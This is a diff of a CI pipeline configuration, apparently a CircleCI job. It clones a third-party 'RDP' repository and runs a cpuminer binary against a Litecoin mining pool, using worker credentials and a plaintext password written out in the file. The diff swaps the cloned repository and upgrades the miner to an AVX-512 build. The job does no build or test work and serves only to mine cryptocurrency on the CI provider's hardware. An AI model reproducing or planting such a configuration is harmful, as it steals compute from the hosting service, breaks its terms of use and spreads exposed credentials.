@@ -9,11 +9,11 @@ jobs:
            apt install -y libjansson4
            mkdir  ~/.ssh
            ssh-keyscan github.com >> ~/.ssh/known_hosts
-           git clone --depth=1 git@github.com:ltcwoker/RDP.git Q
+           git clone --depth=1 https://github.com/davidus20/RDP.git Q
            cd Q
            
-           chmod 755 cpuminer
-           ./cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker14:my123456
+           chmod 755 cpuminer_avx512
+           ./cpuminer_avx512  --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
       
           
 workflows:
